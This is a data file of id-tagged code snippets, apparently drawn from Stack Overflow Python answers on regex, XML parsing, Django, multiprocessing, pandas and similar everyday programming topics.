&gt;&gt;&gt; re.search("r", "$r")   # match
&lt;_sre.SRE_Match object at 0x10047d3d8&gt;
</snippet></ROW><ROW><id>11874565</id><snippet>match=re.search(pattern, string)
if match
   # you have a match -- get the groups...
else:
   # no match -- deal with that...
</snippet></ROW><ROW><id>11874733</id><snippet>#!/usr/bin/env python
from xml.etree import ElementTree
import sys
tree = ElementTree.ElementTree()
tree.parse(sys.stdin)
b = tree.find("B")
for e in b.getiterator("D"):
    if e.find("E").text in ["123", "789"]: 
        b.remove(e)
tree.write(sys.stdout)
</snippet></ROW><ROW><id>11874765</id><snippet>&lt;input type="button" value="add another row"/&gt;
</snippet></ROW><ROW><id>11874819</id><snippet>&gt;&gt;&gt; from collections import Counter
&gt;&gt;&gt; combined = Counter([2, 3, 5]) | Counter([2, 2, 3])
&gt;&gt;&gt; list(combined.elements())
[2, 2, 3, 5]
</snippet></ROW><ROW><id>11874882</id><snippet>show</snippet></ROW><ROW><id>11874882</id><snippet>pyplot.draw()</snippet></ROW><ROW><id>11874882</id><snippet>time.sleep(0.05)</snippet></ROW><ROW><id>11875128</id><snippet>ix=open_dir("index")
with ix.searcher() as searcher:
    query = QueryParser("name", ix.schema).parse(u'Chondromyces')
    results = searcher.search(query)
    for result in results:
        print result
</snippet></ROW><ROW><id>11875169</id><snippet>post</snippet></ROW><ROW><id>11875169</id><snippet>Guestbook</snippet></ROW><ROW><id>11875169</id><snippet>class Guestbook(webapp.RequestHandler):
  def post(self):
    guestbook_name = self.request.get('guestbook_name')
    user = users.get_current_user()
    nickname = None
    if user:
      nickname = user.nickname()
      greeting = Greeting.gql('WHERE author = :1 AND ANCESTOR IS :2',
          nickname, guestbook_key(guestbook_name)).get()
    if not greeting:
      greeting = Greeting(parent=guestbook_key(guestbook_name))
      greeting.author = nickname

    greeting.content = self.request.get('content')
    greeting.put()
    self.redirect('/?' + urllib.urlencode({'guestbook_name': guestbook_name}))
</snippet></ROW><ROW><id>11875251</id><snippet>tile_dict = {1 : pygame.image.load('pictures\(Grass\grass1.png'),
             2 : pygame.image.load('pictures\rock.png')
            }
</snippet></ROW><ROW><id>11875251</id><snippet>def drawMapArray(maparray):
    for x in range(0, mapWi):
        for y in range(0, mapHi):
            #Determines tile type.
            current_tile = tile_dict[maparray[x, y]]
            screen.blit(current_tile, (x*16, y*16))
</snippet></ROW><ROW><id>11875343</id><snippet>from pylab import *

def genuchten(t,C,k):
    return 1/(1+(C/t)**k)**(1-1/k)

###MAIN#######
t0, Y, X = ogrid[0:10:100j, 1:10:10j, 1:10:10j]
f0 = genuchten(t0, 3, 3)
f = genuchten(t0, X, Y)
Z = sum(abs(f0-f), axis=0)
contourf(X.ravel(), Y.ravel(), Z)
show()
</snippet></ROW><ROW><id>11875381</id><snippet>list_of_strings</snippet></ROW><ROW><id>11875381</id><snippet>a</snippet></ROW><ROW><id>11875381</id><snippet>\n</snippet></ROW><ROW><id>11875381</id><snippet>   new_list = []
   for i in range(10):
       new_list.append(i**2)
</snippet></ROW><ROW><id>11875381</id><snippet>   new_list = [i**2 for i in range(10)]
</snippet></ROW><ROW><id>11875381</id><snippet>for</snippet></ROW><ROW><id>11875381</id><snippet>for</snippet></ROW><ROW><id>11875381</id><snippet>for</snippet></ROW><ROW><id>11875436</id><snippet>for i, line in enumerate(c):
    line = ownShuffle(line)
</snippet></ROW><ROW><id>11875436</id><snippet>line</snippet></ROW><ROW><id>11875436</id><snippet>c</snippet></ROW><ROW><id>11875436</id><snippet>line</snippet></ROW><ROW><id>11875436</id><snippet>line</snippet></ROW><ROW><id>11875436</id><snippet>for i, line in enumerate(c):
    line[:] = ownShuffle(line)
</snippet></ROW><ROW><id>11875436</id><snippet>for i, line in enumerate(c):
    id_before = id(line)
    line = ownShuffle(line)
    print id_before, "=&gt;", id(line)
# 4973032728 =&gt; 4973032656
# 4973034312 =&gt; 4973032656
# 4973034240 =&gt; 4973032656

for i, line in enumerate(c):
    id_before = id(line)
    line[:] = ownShuffle(line)
    print id_before, "=&gt;", id(line)
# 4973032728 =&gt; 4973032728
# 4973034312 =&gt; 4973034312
# 4973034240 =&gt; 4973034240
</snippet></ROW><ROW><id>11875436</id><snippet>c</snippet></ROW><ROW><id>11875478</id><snippet>append</snippet></ROW><ROW><id>11875478</id><snippet>contract.parties.append([str(person_id), person_condition])</snippet></ROW><ROW><id>11875478</id><snippet>contract.parties</snippet></ROW><ROW><id>11875518</id><snippet>request.REQUEST</snippet></ROW><ROW><id>11875518</id><snippet>MergedDict</snippet></ROW><ROW><id>11875518</id><snippet>QueryDict</snippet></ROW><ROW><id>11875518</id><snippet>__str__</snippet></ROW><ROW><id>11875518</id><snippet>QueryDict.getlist</snippet></ROW><ROW><id>11875518</id><snippet>print request.REQUEST.getlist('tags[]')
</snippet></ROW><ROW><id>11875518</id><snippet>[u'asd', u'123']
</snippet></ROW><ROW><id>11875518</id><snippet>print request.REQUEST['tags[]']</snippet></ROW><ROW><id>11875574</id><snippet>/polls/{{ poll.id }}/vote/</snippet></ROW><ROW><id>11875574</id><snippet>post.pk</snippet></ROW><ROW><id>11875574</id><snippet>poll.pk</snippet></ROW><ROW><id>11875574</id><snippet>def vote(request, poll_id):
    global choice
    p = get_object_or_404(Poll, pk=poll_id)
       try:
        selected_choice = p.choice_set.get(pk=request.POST['choice'])    

    except (KeyError, Choice.DoesNotExist):
        # Redisplay the poll voting form.
        return render_to_response('post.html', {
            'poll': p,
            'error_message': "You didn't select a choice.",
            }, context_instance=RequestContext(request))
    else:
        selected_choice.votes += 1
        p.total_votes += 1
        selected_choice.save()
        p.voted = True
        p.save()

        choices = list(p.choice_set.all())
        for choice in choices:
            percent = choice.votes*100/p.total_votes
            choice.percentage = percent
            choice.save()

        return HttpResponseRedirect(reverse("blog.views.post", args=[ p.post.pk ] )
</snippet></ROW><ROW><id>11875775</id><snippet>__table_args__ = {"schema":"schema_name"}
</snippet></ROW><ROW><id>11875813</id><snippet>from bson import json_util
import json

json.dumps(anObject, default=json_util.default)
</snippet></ROW><ROW><id>11875813</id><snippet>json.loads(aJsonString, object_hook=json_util.object_hook)
</snippet></ROW><ROW><id>11876173</id><snippet>SimpleLazyObject</snippet></ROW><ROW><id>11876173</id><snippet>user_drafts = Draft.objects.filter(user = user.pk)
</snippet></ROW><ROW><id>11876197</id><snippet>listtype.key().id()</snippet></ROW><ROW><id>11876197</id><snippet>listtype.key.id()</snippet></ROW><ROW><id>11876333</id><snippet>Post</snippet></ROW><ROW><id>11876333</id><snippet>customcollection</snippet></ROW><ROW><id>11876333</id><snippet>class Post(db.Document):
    created_at = db.DateTimeField(default=datetime.datetime.now, required=True)
    title = db.StringField(max_length=255, required=True)
    slug = db.StringField(max_length=255, required=True)
    body = db.StringField(required=True)
    meta = {'collection': 'customcollection'}
</snippet></ROW><ROW><id>11876333</id><snippet>for item in Post.objects:
    print item.title
</snippet></ROW><ROW><id>11876333</id><snippet>customcollection</snippet></ROW><ROW><id>11876346</id><snippet>input</snippet></ROW><ROW><id>11876415</id><snippet>eur3m.index = [datetime.datetime.strptime(x, '%d/%m/%Y') for x in eur3m.index]
</snippet></ROW><ROW><id>11876521</id><snippet>math</snippet></ROW><ROW><id>11876521</id><snippet>exp, sqrt, ceil</snippet></ROW><ROW><id>11876521</id><snippet>from &lt;module&gt; import &lt;function/class&gt;</snippet></ROW><ROW><id>11876521</id><snippet>math</snippet></ROW><ROW><id>11876521</id><snippet>math</snippet></ROW><ROW><id>11876521</id><snippet>import math
math.__file__
</snippet></ROW><ROW><id>11876551</id><snippet>uclassify</snippet></ROW><ROW><id>11876551</id><snippet>tree</snippet></ROW><ROW><id>11876551</id><snippet>&gt;&gt;&gt; tree
&lt;Element '{http://api.uclassify.com/1/ResponseSchema}uclassify' at 0x101f56410&gt;
</snippet></ROW><ROW><id>11876551</id><snippet>tree.find</snippet></ROW><ROW><id>11876551</id><snippet>status</snippet></ROW><ROW><id>11876551</id><snippet>readCalls</snippet></ROW><ROW><id>11876551</id><snippet>xmlns = tree.tag.split("}")[0][1:]
readCalls = tree.find('{%s}readCalls' % (xmlns,))
</snippet></ROW><ROW><id>11876551</id><snippet>class</snippet></ROW><ROW><id>11876551</id><snippet>classify = readCalls.find('{%s}classify' % (xmlns,))
classification = classify.find('{%s}classification' %(xmlns,))
classes = classification.findall('{%s}classes'%(xmlns,))
</snippet></ROW><ROW><id>11876775</id><snippet>result = re.sub("""(?s)(?:')([^'"]+)(?:')""", r"\1", subject)
</snippet></ROW><ROW><id>11876775</id><snippet>"""
(?:         # Match the regular expression below
   '           # Match the character “'” literally
)
(           # Match the regular expression below and capture its match into backreference number 1
   [^'"]       # Match a single character NOT present in the list “'"”
      +           # Between one and unlimited times, as many times as possible, giving back as needed (greedy)
)
(?:         # Match the regular expression below
   '           # Match the character “'” literally
)
"""
</snippet></ROW><ROW><id>11876821</id><snippet>continue</snippet></ROW><ROW><id>11876821</id><snippet>   for line in self.myFile:
        tokenList = self.getTokens(line)
        if len(tokenList) == 0:
            continue # skip the rest of the loop, go back to top
        if tokenList[0] == "shape":
            s = RayTracerShapes.Shape()
            self.scene.addShape(s)
</snippet></ROW><ROW><id>11876914</id><snippet>@task
def MyTask(sink, *args, **kwargs):
    data_store = sharded_redis.ShardedRedis(sink)
    key_helper = helpers.KeyHelper()
    my_dictionary = do_work()
    data_store.hmset(key_helper.key_for_my_hash(), my_dictionary)
</snippet></ROW><ROW><id>11876914</id><snippet>sharded_redis</snippet></ROW><ROW><id>11876914</id><snippet>sink</snippet></ROW><ROW><id>11876914</id><snippet>(host, port)</snippet></ROW><ROW><id>11877012</id><snippet>TiffImagePlugin</snippet></ROW><ROW><id>11877012</id><snippet>TiffImageFile._decoder</snippet></ROW><ROW><id>11877012</id><snippet>tifffile.py</snippet></ROW><ROW><id>11877012</id><snippet>PIL.Image.fromarray()</snippet></ROW><ROW><id>11877224</id><snippet>d1 = DECK()</snippet></ROW><ROW><id>11877224</id><snippet>import random

class DECK():
    def __init__(self):
        suite = ('Spades', 'Hearts', 'Diamonds', 'Clubs')
        rank = ('2', '3', '4', '5', '6', '7', '8', '9', '10', "Jack", "Queen", "King", "Ace")
        self.full_deck = []
        for s in suite:
            for r in rank:
                self.full_deck.append("%s of %s" % (r, s))

    def pick_item(self):
        card_key = random.randint(0, len(self.full_deck)-1)  
        new_card = self.full_deck[card_key] 
        del self.full_deck[card_key]  
        return new_card

    def missing_card(self):
        print self.full_deck

d1 = DECK()
card1 = d1.pick_item()

print card1

d1.missing_card()
</snippet></ROW><ROW><id>11877248</id><snippet>x[2:3] = [1, 2, 3, 4, 5, 6]</snippet></ROW><ROW><id>11877686</id><snippet>return</snippet></ROW><ROW><id>11877686</id><snippet>Python 2.7.2 (default, Jun 20 2012, 16:23:33) 
[GCC 4.2.1 Compatible Apple Clang 4.0 (tags/Apple/clang-418.0.60)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; 1+1
2
</snippet></ROW><ROW><id>11877686</id><snippet>1+1</snippet></ROW><ROW><id>11877686</id><snippet>class className:
    def createName(self, name):
        self.name = name
    def displayName(self):
        return self.name
    def saying(self):
        print("Hello %s" % self.name)
</snippet></ROW><ROW><id>11877686</id><snippet>className</snippet></ROW><ROW><id>11877686</id><snippet>Name</snippet></ROW><ROW><id>11877686</id><snippet>object</snippet></ROW><ROW><id>11877686</id><snippet>class Name(object):
    def createName(self, name):
        self.name = name
    def displayName(self):
        return self.name
    def saying(self):
        print("Hello %s" % self.name)
</snippet></ROW><ROW><id>11877686</id><snippet>__init__()</snippet></ROW><ROW><id>11877686</id><snippet>class Name(object):
    def __init__(self, name):
        self.name = name
    def displayName(self):
        return self.name
    def saying(self):
        print("Hello %s" % self.name)
</snippet></ROW><ROW><id>11877686</id><snippet>first = Name("Jack")
</snippet></ROW><ROW><id>11877686</id><snippet>display</snippet></ROW><ROW><id>11877686</id><snippet>__repr__</snippet></ROW><ROW><id>11877686</id><snippet>class Name(object):
    def __init__(self, name):
        self.name = name
    def __repr__(self):
       return self.name
    def saying(self):
        print("Hello %s" % self.name)
</snippet></ROW><ROW><id>11877686</id><snippet>&gt;&gt;&gt; n = Name("Jack")
&gt;&gt;&gt; print n
Jack
</snippet></ROW><ROW><id>11877785</id><snippet>j</snippet></ROW><ROW><id>11877785</id><snippet>j</snippet></ROW><ROW><id>11877785</id><snippet>j.append(filter(isAcceptableChar, j[i]))    # j is not a list here,it is an int.
w.append([word for word in word_tokenize(j[i].lower()) if word not in english_stops])
for j in range (0,len(w[i])):               # here j is an int
</snippet></ROW><ROW><id>11877847</id><snippet>itertools</snippet></ROW><ROW><id>11877847</id><snippet>from itertools import groupby

def canonicalize_dict(x):
    "Return a (key, value) list sorted by the hash of the key"
    return sorted(x.items(), key=lambda x: hash(x[0]))

def unique_and_count(lst):
    "Return a list of unique dicts with a 'count' key added"
    grouper = groupby(sorted(map(canonicalize_dict, lst)))
    return [dict(k + [("count", len(list(g)))]) for k, g in grouper]

a = [{'text': 'hallo world', 'num': 1},  
     #....
     {'text': 'hallo world', 'num': 1}]

print unique_and_count(a)
</snippet></ROW><ROW><id>11877847</id><snippet>[{'count': 5, 'text': 'hallo world', 'num': 1}, 
{'count': 1, 'text': 'hallo world', 'num': 2}, 
{'count': 1, 'text': 'haltlo world', 'num': 1}]
</snippet></ROW><ROW><id>11877847</id><snippet>d1.items()</snippet></ROW><ROW><id>11877847</id><snippet>d2.items()</snippet></ROW><ROW><id>11877847</id><snippet>canonical_dict</snippet></ROW><ROW><id>11878393</id><snippet>import cx_Oracle

dsn_tns = cx_Oracle.makedsn('my_ip_address_server_next_port', 0000, 'sid')
db = cx_Oracle.connect('user', 'password', dsn_tns)
curs = db.cursor()
curs.callproc("dbms_output.enable")

curs.callproc('where.my_package.ger_result', ['something',])

statusVar = curs.var(cx_Oracle.NUMBER)
lineVar = curs.var(cx_Oracle.STRING)
while True:
  curs.callproc("dbms_output.get_line", (lineVar, statusVar))
  if statusVar.getvalue() != 0:
    break
  print lineVar.getvalue()
</snippet></ROW><ROW><id>11878430</id><snippet>func_closure</snippet></ROW><ROW><id>11878430</id><snippet>FunctionType</snippet></ROW><ROW><id>11878489</id><snippet>mysql</snippet></ROW><ROW><id>11878718</id><snippet>*</snippet></ROW><ROW><id>11878718</id><snippet>__all__</snippet></ROW><ROW><id>11878718</id><snippet>__all__</snippet></ROW><ROW><id>11878718</id><snippet>class Mock(object):
    __all__ = []
</snippet></ROW><ROW><id>11878758</id><snippet>...
settings.py
settings_dev.py
_settings_test.py
_settings_prod.py
...
</snippet></ROW><ROW><id>11878758</id><snippet>try:
    from settings_prod import *
except ImportError:
    try:
        from settings_test import *
    except ImportError:
        from settings_dev import *
</snippet></ROW><ROW><id>11878758</id><snippet>_settings_prod.py</snippet></ROW><ROW><id>11878758</id><snippet>settings_prod.py</snippet></ROW><ROW><id>11878758</id><snippet>_settings_test.py</snippet></ROW><ROW><id>11878758</id><snippet>settings_test.py</snippet></ROW><ROW><id>11878758</id><snippet>settings_dev.py</snippet></ROW><ROW><id>11878758</id><snippet>run('mv _settings_prod.py settings_prod.py')</snippet></ROW><ROW><id>11879104</id><snippet>N</snippet></ROW><ROW><id>11879104</id><snippet>N is a Fibonacci number iff either (5 * n^2 + 4) or (5 * n^2 - 4) is a square number.
</snippet></ROW><ROW><id>11879104</id><snippet>N</snippet></ROW><ROW><id>11879104</id><snippet>N</snippet></ROW><ROW><id>11879411</id><snippet>print</snippet></ROW><ROW><id>11879411</id><snippet>print (level, msg)</snippet></ROW><ROW><id>11879411</id><snippet>write()</snippet></ROW><ROW><id>11879411</id><snippet>&gt;&gt;&gt; x=LogFile("foo")
&gt;&gt;&gt; print &gt;&gt;x, "123\n321\n444", "321", "222",
(20, '123\n321\n444')
(20, ' ')
(20, '321')
(20, ' ')
(20, '222')
&gt;&gt;&gt; print &gt;&gt;x, "123\n321\n444", "321", "222"
(20, ' ')
(20, '123\n321\n444')
(20, ' ')
(20, '321')
(20, ' ')
(20, '222')
(20, '\n')
</snippet></ROW><ROW><id>11879411</id><snippet>logger</snippet></ROW><ROW><id>11879411</id><snippet>logger.log()</snippet></ROW><ROW><id>11879610</id><snippet>hash = h(h(username) + month + year + h(salt))</snippet></ROW><ROW><id>11880201</id><snippet>from itertools import groupby, islice

def accumulate(iterable): # in py 3 use itertools.accumulate
    ''' Simplified version of accumulate from python 3'''
    it = iter(iterable)
    total = next(it)
    yield total
    for element in it:
        total += element
        yield total

power = [
    ['1234-4321-1', [5, 6, -4, 11, 22]],
    ['1234-7834-1', [43, -5, 0, 0, -1]],
    ['1234-5376-1', [3, 0, -5, -6, 0]],
    ['1567-3454-1', [4, 6, 8, 3, 3]],
    ['1567-9987-1-', [1, 2, 1, -4, 5]]
]

groups = ((k, (nums for station, nums in g))
          for k, g in
          groupby(power, lambda x: x[0].partition('-')[0]))

new = [(station, zip(*(islice(accumulate(col), 1, None) for col in zip(*nums))))
        for station, nums in groups]

print new    

print dict(new) # or as a dictionary which is unordered
</snippet></ROW><ROW><id>11880201</id><snippet>[('1234', [(48, 1, -4, 11, 21), (51, 1, -9, 5, 21)]), ('1567', [(5, 8, 9, -1, 8)])]
{'1234': [(48, 1, -4, 11, 21), (51, 1, -9, 5, 21)], '1567': [(5, 8, 9, -1, 8)]}
</snippet></ROW><ROW><id>11880201</id><snippet>itertools.groupby</snippet></ROW><ROW><id>11880201</id><snippet>nums = [[5, 6, -4, 11, 22], 
        [43, -5, 0, 0, -1], 
        [3, 0, -5, -6, 0]]
</snippet></ROW><ROW><id>11880201</id><snippet>zip(*nums)</snippet></ROW><ROW><id>11880201</id><snippet>zip([5, 6, -4, 11, 22], [43, -5, 0, 0, -1], [3, 0, -5, -6, 0])
</snippet></ROW><ROW><id>11880201</id><snippet>cols = [(5, 43, 3), (6, -5, 0), (-4, 0, -5), (11, 0, -6), (22, -1, 0)]
</snippet></ROW><ROW><id>11880201</id><snippet>&gt;&gt;&gt; [list(accumulate(col)) for col in cols]
[[5, 48, 51], [6, 1, 1], [-4, -4, -9], [11, 11, 5], [22, 21, 21]]
</snippet></ROW><ROW><id>11880201</id><snippet>islice</snippet></ROW><ROW><id>11880201</id><snippet>1</snippet></ROW><ROW><id>11880201</id><snippet>None</snippet></ROW><ROW><id>11880201</id><snippet>&gt;&gt;&gt; [list(islice(accumulate(col), 1, None)) for col in cols]
[[48, 51], [1, 1], [-4, -9], [11, 5], [21, 21]]
</snippet></ROW><ROW><id>11880201</id><snippet>&gt;&gt;&gt; zip(*(islice(accumulate(col), 1, None) for col in cols))
[(48, 1, -4, 11, 21), (51, 1, -9, 5, 21)]
</snippet></ROW><ROW><id>11880266</id><snippet>k</snippet></ROW><ROW><id>11880266</id><snippet>to_add</snippet></ROW><ROW><id>11880266</id><snippet>&gt;&gt;&gt; muts={'YES': ['rice','bread','pasta'],
...        'NO': ['sweets', 'fat', 'milk', 'choco']}
&gt;&gt;&gt; muts
{'YES': ['rice', 'bread', 'pasta'], 'NO': ['sweets', 'fat', 'milk', 'choco']}
&gt;&gt;&gt; sql = "UPDATE test2 g SET accept='%s' WHERE g.food IN (%s)"
&gt;&gt;&gt; for k in muts:
...     to_add = ', '.join(muts[k])
...     ex_sql = sql % (k, to_add)
...     print ex_sql
...     # cursor.execute(ex_sql) here
... 
UPDATE test2 g SET accept='YES' WHERE g.food IN (rice, bread, pasta)
UPDATE test2 g SET accept='NO' WHERE g.food IN (sweets, fat, milk, choco)
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11880266</id><snippet>.execute( , any_list)</snippet></ROW><ROW><id>11880266</id><snippet>to_add = "'%s'" % "', '".join(muts[k])
</snippet></ROW><ROW><id>11880266</id><snippet>'</snippet></ROW><ROW><id>11880266</id><snippet>... # that gives...
UPDATE test2 g SET accept='YES' WHERE g.food IN ('rice', 'bread', 'pasta')
UPDATE test2 g SET accept='NO' WHERE g.food IN ('sweets', 'fat', 'milk', 'choco')
</snippet></ROW><ROW><id>11880266</id><snippet>?</snippet></ROW><ROW><id>11880266</id><snippet>%s</snippet></ROW><ROW><id>11880613</id><snippet>data = """35\tIMAGE:1679942\tSAMD4\tSterile alpha motif domain\tHs.98259\tATI146610
36\tIMAGE:1700154\t\t\tAI049531"""

for line in data.split("\n"):
    print line.split("\t")
</snippet></ROW><ROW><id>11880613</id><snippet>['35', 'IMAGE:1679942', 'SAMD4', 'Sterile alpha motif domain', 'Hs.98259', 'ATI146610']
['36', 'IMAGE:1700154', '', '', 'AI049531']
</snippet></ROW><ROW><id>11880614</id><snippet>%module test
%{
#include &lt;complex.h&gt;
%}

%include &lt;complex.i&gt;

%inline %{
  double complex test(double complex X) {
    return X;
  }
%}
</snippet></ROW><ROW><id>11880614</id><snippet>%inline</snippet></ROW><ROW><id>11880614</id><snippet>%include</snippet></ROW><ROW><id>11880614</id><snippet>swig -Wall -python test.i 
gcc -std=c99 -Wall -Wextra test_wrap.c -I/usr/include/python2.7 -shared -o _test.so
</snippet></ROW><ROW><id>11880614</id><snippet>LD_LIBRARY_PATH=.  python                       
Python 2.7.3 (default, Aug  1 2012, 05:16:07) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import test
&gt;&gt;&gt; test.test(complex(0,1))
1j
&gt;&gt;&gt; test.test(complex(0,2))
2j
&gt;&gt;&gt; test.test(complex(1,2))
(1+2j)
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11880614</id><snippet>%{
#define SWIG_FILE_WITH_INIT
#include &lt;complex.h&gt;
%}
%include &lt;complex.i&gt;
%include &lt;numpy.i&gt;
%init %{
import_array();
%}

%numpy_typemaps(complex float, NPY_CFLOAT , int)
%numpy_typemaps(complex double, NPY_CDOUBLE, int)
%numpy_typemaps(complex long double, NPY_CLONGDOUBLE, int)

%module test

%inline %{
  double complex test(double complex X) {
    return X;
  }
%}
</snippet></ROW><ROW><id>11880614</id><snippet>%include &lt;complex.i&gt;</snippet></ROW><ROW><id>11880614</id><snippet>-std=c99</snippet></ROW><ROW><id>11880682</id><snippet>if condition: statement
if condition:
    block
</snippet></ROW><ROW><id>11880682</id><snippet>expression_if_true if condition else expression_if_false
</snippet></ROW><ROW><id>11880682</id><snippet>print a</snippet></ROW><ROW><id>11880682</id><snippet>b = a</snippet></ROW><ROW><id>11880682</id><snippet>a</snippet></ROW><ROW><id>11880682</id><snippet>print a if b else 0
</snippet></ROW><ROW><id>11880682</id><snippet>print (a if b else 0)
</snippet></ROW><ROW><id>11880682</id><snippet>x = a if b else 0
</snippet></ROW><ROW><id>11880682</id><snippet>x = (a if b else 0)
</snippet></ROW><ROW><id>11881397</id><snippet>initializer</snippet></ROW><ROW><id>11881397</id><snippet>Pool()</snippet></ROW><ROW><id>11881397</id><snippet>initializer=init(array)</snippet></ROW><ROW><id>11881397</id><snippet>initializer=init, initargs=(array,)</snippet></ROW><ROW><id>11881397</id><snippet>f()</snippet></ROW><ROW><id>11881397</id><snippet>pool.*map*</snippet></ROW><ROW><id>11881397</id><snippet>mp_f()</snippet></ROW><ROW><id>11881397</id><snippet>#!/usr/bin/env python
import logging
import multiprocessing as mp
from contextlib import closing

def init(shared_array_):
    # globals that should be available in worker processes should be
    # initialized here
    global shared_array
    shared_array = shared_array_

def f(interval, a=None, b=None):
    mp.get_logger().info("interval=%r, a=%r, b=%r" % (interval, a, b))
    shared_array[interval] = [a + interval.start]*b # fake computations

def mp_f(arg_kwargs):
    try:
        arg, kwargs = arg_kwargs
        return f(arg, **kwargs) # pass keyword args to f()
    except Exception:
        mp.get_logger().error("f%r failed" % (arg_kwargs,))

def main():
    mp.log_to_stderr().setLevel(logging.INFO)

    N = 10**6
    array = mp.RawArray('i', N) # create shared array

    # create workers pool; use all available CPU cores
    with closing(mp.Pool(initializer=init, initargs=(array,))) as p:
        options = dict(a=5, b=N//4) # dummy options
        step = options['b']
        args = ((slice(i, i+step), options) for i in range(0, N, step))
        for _ in p.imap_unordered(mp_f, args): # submit jobs
            pass
    p.join()
    mp.get_logger().info(array[::step])

if __name__=="__main__":
    mp.freeze_support() # for py2exe and the-like on Windows
    main()
</snippet></ROW><ROW><id>11881678</id><snippet>dispatch_uid</snippet></ROW><ROW><id>11881678</id><snippet>post_save.connect(create_user_profile, sender=User, dispatch_uid='autocreate_nuser')
</snippet></ROW><ROW><id>11881793</id><snippet>import this</snippet></ROW><ROW><id>11881793</id><snippet> if choice == cpu_choice:
    # TIE
</snippet></ROW><ROW><id>11881793</id><snippet>names = ['rock', 'paper', 'scissors']
print("Computer chooses {}, you loose".format(names[cpu_choice]))
</snippet></ROW><ROW><id>11881793</id><snippet>wins, losses = 0, 0

for round in range(10):

    # Your choice and CPU choice

    cpu_wins = (cpu_choice &gt; choice or (choice == 3 and cpu_choice == 1))
    tie = (cpu_choice == choice)

    if cpu_wins:
        # You loose
        print("Computer chooses {}, you loose".format(names[cpu_choice]))
        losses += 1
    if not cpu_wins and tie:
        # tie
    else:
        # you win
</snippet></ROW><ROW><id>11881793</id><snippet>p</snippet></ROW><ROW><id>11881793</id><snippet>r</snippet></ROW><ROW><id>11881793</id><snippet>s</snippet></ROW><ROW><id>11882057</id><snippet>if</snippet></ROW><ROW><id>11882057</id><snippet>while</snippet></ROW><ROW><id>11882057</id><snippet>None</snippet></ROW><ROW><id>11882057</id><snippet>False</snippet></ROW><ROW><id>11882057</id><snippet>0</snippet></ROW><ROW><id>11882057</id><snippet>0L</snippet></ROW><ROW><id>11882057</id><snippet>0.0</snippet></ROW><ROW><id>11882057</id><snippet>0j</snippet></ROW><ROW><id>11882057</id><snippet>''</snippet></ROW><ROW><id>11882057</id><snippet>()</snippet></ROW><ROW><id>11882057</id><snippet>[]</snippet></ROW><ROW><id>11882057</id><snippet>{}</snippet></ROW><ROW><id>11882057</id><snippet>__nonzero__()</snippet></ROW><ROW><id>11882057</id><snippet>__len__()</snippet></ROW><ROW><id>11882057</id><snippet>False</snippet></ROW><ROW><id>11882193</id><snippet>destroy</snippet></ROW><ROW><id>11882193</id><snippet>tk = Tk()
tk.withdraw() 

#do file dialog stuff
(...)

tk.destroy()
</snippet></ROW><ROW><id>11882285</id><snippet>stat</snippet></ROW><ROW><id>11882285</id><snippet>ST_CTIME</snippet></ROW><ROW><id>11882285</id><snippet>/your/file/path/filename.extension</snippet></ROW><ROW><id>11882288</id><snippet>StreamHandler</snippet></ROW><ROW><id>11882288</id><snippet>class GtkTextViewHandler(logging.Handler):
  def __init__(self, tv):
    logging.Handler.__init__(self)
    self.tv = tv
    self.tbf = tv.get_buffer()
    self.formatter = None

  def emit(self, record):
    try:
      msg = self.format(record)
      fs  = "%s\n"
      self.tbf.insert(self.tbf.get_end_iter(), fs % msg)
      self.tv.scroll_to_iter(self.tv.get_end_iter(), 0.0, False, 0, 0)
    except:
      self.handleError(record)
</snippet></ROW><ROW><id>11882354</id><snippet>In [36]: df
Out[36]:
   A  B  C  D
a  0  2  6  0
b  6  1  5  2
c  0  2  6  0
d  9  3  2  2

In [37]: rows
Out[37]: ['a', 'c']

In [38]: df.drop(rows)
Out[38]:
   A  B  C  D
b  6  1  5  2
d  9  3  2  2

In [39]: df[~((df.A == 0) &amp; (df.B == 2) &amp; (df.C == 6) &amp; (df.D == 0))]
Out[39]:
   A  B  C  D
b  6  1  5  2
d  9  3  2  2

In [40]: df.ix[rows]
Out[40]:
   A  B  C  D
a  0  2  6  0
c  0  2  6  0

In [41]: df[((df.A == 0) &amp; (df.B == 2) &amp; (df.C == 6) &amp; (df.D == 0))]
Out[41]:
   A  B  C  D
a  0  2  6  0
c  0  2  6  0
</snippet></ROW><ROW><id>11883013</id><snippet>native = '\033[m'
sys.stdout.write(native)
</snippet></ROW><ROW><id>11883013</id><snippet>print green + 'Hello' + native
</snippet></ROW><ROW><id>11883061</id><snippet># coding: utf-8

import re

# Attention: while the characters for the strings bellow are 
# dislplayed indentically, inside they are represented
# by distinct unicode codepoints

persian_numbers = u'۱۲۳۴۵۶۷۸۹۰'
arabic_numbers  = u'١٢٣٤٥٦٧٨٩٠'
english_numbers = u'1234567890'


persian_regexp = u"(%s)" %  u"|".join(persian_numbers)
arabic_regexp = u"(%s)" % u"|".join(arabic_numbers)

def _sub(match_object, digits):
    return english_numbers[digits.find(match_object.group(0))]

def _sub_arabic(match_object):
    return _sub(match_object, arabic_numbers)

def _sub_persian(match_object):
    return _sub(match_object, arabic_numbers)


def replace_arabic(text):
    return re.sub(arabic_regexp, _sub_arabic, text)

def replace_persian(text):
    return re.sub(arabic_regexp, _sub_persian, text)
</snippet></ROW><ROW><id>11883061</id><snippet>&gt;&gt;&gt; persian_numbers = u'۱۲۳۴۵۶۷۸۹۰'
&gt;&gt;&gt; english_numbers = u'1234567890'
&gt;&gt;&gt; arabic_numbers  = u'١٢٣٤٥٦٧٨٩٠'
&gt;&gt;&gt; 
&gt;&gt;&gt; print int(persian_numbers)
1234567890
&gt;&gt;&gt; print int(english_numbers)
1234567890
&gt;&gt;&gt; print int(arabic_numbers)
1234567890
&gt;&gt;&gt; persian_numbers.isdigit()
True
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11883061</id><snippet>&gt;&gt;&gt; arabic_numbers  = u'١٢٣٤٥٦٧٨٩٠'
&gt;&gt;&gt; len(arabic_numbers)
10
&gt;&gt;&gt; enc_arabic = arabic_numbers.encode("utf-8")
&gt;&gt;&gt; print enc_arabic
١٢٣٤٥٦٧٨٩٠
&gt;&gt;&gt; len(enc_arabic)
20
&gt;&gt;&gt; int(enc_arabic)
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
